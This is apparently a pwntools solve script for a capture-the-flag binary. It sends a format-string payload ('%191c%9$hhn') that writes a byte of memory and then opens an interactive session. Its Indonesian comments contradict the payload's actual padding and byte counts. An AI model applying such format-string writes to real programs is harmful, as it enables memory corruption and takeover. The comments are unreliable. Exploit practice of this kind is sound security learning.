from pwn import *


from pwn import *


# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset

io = start()

io.clean(1)

io.send(b'10')

io.clean(1)

# Menggunakan 11 karakter padding, lalu `%191c%9$hhn` dengan 'n' di byte ke-16
# Dalam hal ini, seluruh payload harus berukuran 16 byte
payload = b'AAAAA%191c%9$hhn'
# Ini mengasumsikan bahwa '%191c%9$hhn' mencakup tepat 10 byte
io.send(payload)

io.interactive()
